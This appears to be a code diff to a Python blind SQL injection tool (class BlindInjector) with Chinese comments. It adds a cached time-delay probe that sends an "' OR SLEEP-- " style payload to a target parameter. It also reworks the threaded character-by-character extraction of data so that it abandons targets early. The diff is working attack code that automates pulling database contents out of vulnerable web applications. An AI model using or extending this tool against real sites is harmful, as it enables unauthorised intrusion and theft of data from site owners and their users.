@@ -240,6 +240,23 @@ class BlindInjector:
         self.classifier = ResponseClassifier(self.sess, timeout)
         self.baseline_time = 0.0
         self._req_counter = 0
+        self._time_ok: Optional[bool] = None
+
+    def _time_delay_confirmed(self, url: str, param: str) -> bool:
+        """单次探测目标是否响应时间延迟 (结果缓存)。"""
+        if self._time_ok is not None:
+            return self._time_ok
+        if self.dbms not in SLEEP_FN:
+            self._time_ok = False
+            return False
+        payload = "' OR %s-- " % (SLEEP_FN[self.dbms] % 1)
+        try:
+            start = time.time()
+            self.sess.get(build_url(url, param, payload), timeout=self.timeout + 3)
+            self._time_ok = (time.time() - start) >= 0.7
+        except Exception:
+            self._time_ok = False
+        return self._time_ok
 
     def _auto_detect_dbms(self, url: str, param: str) -> Optional[str]:
         for dbms in ["mysql", "mssql", "postgresql", "oracle"]:
@@ -410,15 +427,34 @@ class BlindInjector:
 
         results = [None] * max_len
 
-        def _extract_at(pos: int) -> Tuple[int, Optional[str]]:
-            ch = extract_fn(url, param, query, pos)
-            return pos, ch
+        # time 盲注前置探测: 目标若不响应延迟, 直接放弃, 避免无效二分请求
+        if self.tech == BlindTech.TIME and not self._time_delay_confirmed(url, param):
+            return ""
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
-            futures = {ex.submit(_extract_at, pos): pos for pos in range(1, max_len + 1)}
-            for future in concurrent.futures.as_completed(futures):
-                pos, ch = future.result()
-                results[pos - 1] = ch
+        def _extract_at(pos: int) -> Tuple[int, Optional[str]]:
+            try:
+                return pos, extract_fn(url, param, query, pos)
+            except Exception as e:
+                logger.debug("extract pos %d: %s", pos, e)
+                return pos, None
+
+        def _run_batch(positions: List[int]) -> None:
+            if not positions:
+                return
+            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
+                futures = {ex.submit(_extract_at, pos): pos for pos in positions}
+                for fut in concurrent.futures.as_completed(futures):
+                    pos, ch = fut.result()
+                    results[pos - 1] = ch
+
+        # 先探测前 2 位：若提取不可行 (全为 None) 则立即放弃，
+        # 避免对剩余位置发起无谓请求。
+        probe = min(2, max_len)
+        _run_batch(list(range(1, probe + 1)))
+        if probe < max_len:
+            if all(results[i] is None for i in range(probe)):
+                return "".join(r for r in results if r is not None)
+            _run_batch(list(range(probe + 1, max_len + 1)))
 
         return "".join(r for r in results if r is not None)
 
